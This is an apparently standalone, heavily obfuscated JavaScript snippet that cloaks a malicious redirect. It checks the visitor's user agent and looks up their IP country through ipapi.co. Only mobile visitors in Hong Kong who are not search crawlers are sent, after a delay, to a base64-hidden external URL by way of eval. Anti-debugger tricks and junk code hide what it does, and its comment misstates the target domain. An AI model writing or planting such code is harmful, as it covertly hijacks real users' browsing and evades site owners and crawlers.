(function () {
  const $𝟏𝒙 = (𝒕) => new Promise(𝒓 => setTimeout(𝒓, 𝒕));
  const $𝒈𝒐 = async () => {
    const $𝒋𝒏𝒌 = () => {
      const $𝒉 = Math['\u0072\u0061\u006e\u0064\u006f\u006d']().toString(36).substr(2);
      return $𝒉.split('').reverse().join('');
    };
    const $𝒖𝒂 = navigator['\u0075\u0073\u0065\u0072\u0041\u0067\u0065\u006e\u0074']['\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065']();
    const $𝒎𝒃 = /iphone|android|ipad/.test($𝒖𝒂);
    const $𝒃𝒕 = /googlebot|bingbot|slurp|duckduckbot/.test($𝒖𝒂);
    const $𝒇𝒆 = await fetch(String.fromCharCode(...[104,116,116,112,115,58,47,47,105,112,97,112,105,46,99,111,47,106,115,111,110]));
    const $𝒊𝒑 = await $𝒇𝒆.json();
    const $𝒉𝒌 = $𝒊𝒑 && $𝒊𝒑['\u0063\u006f\u0075\u006e\u0074\u0072\u0079'] === String.fromCharCode(72, 75);
    const $𝒉𝒔 = await crypto['\u0073\u0075\u0062\u0074\u006c\u0065']['\u0064\u0069\u0067\u0065\u0073\u0074'](
      'SHA-256',
      new TextEncoder()['\u0065\u006e\u0063\u006f\u0064\u0065']($𝒋𝒏𝒌() + Date.now())
    );
    for (let $𝒊 = 0; $𝒊 < new Uint8Array($𝒉𝒔).length; $𝒊 += 10) {
      Math['\u0073\u0071\u0072\u0074']($𝒊) + $𝒉𝒔['\u0062\u0079\u0074\u0065\u004c\u0065\u006e\u0067\u0074\u0068'];
    }
    return $𝒎𝒃 && !$𝒃𝒕 && $𝒉𝒌;
  };

  (async () => {
    const $𝒅𝒖𝒎 = {
      𝓪: 123,
      𝓫: navigator['language'],
      𝓬: Math.random().toString().split('.')[1]
    };

    const $𝒃𝒂𝒊𝒕 = () => {
      if (typeof window === 'undefined') return false;
      try {
        new Function("return (function(){}.constructor('debugger')())")();
      } catch (_) {}
    };

    const $𝒏𝒐 = () => ['💣', Date.now(), location.pathname].join('-');
    $𝒃𝒂𝒊𝒕(); $𝒏𝒐();

    if (await $𝒈𝒐()) {
      const $𝒍𝒊𝒏 = "aHR0cHM6Ly9kcmVhbWg5LmNvbS8="; // https://dreamx9.com
      await $𝟏𝒙(5000 + Math.floor(Math.random() * 300));
      const $𝒅𝒆 = atob($𝒍𝒊𝒏);
      eval("window" + "." + "location" + "." + "href = $𝒅𝒆");
    }
  })();
})();
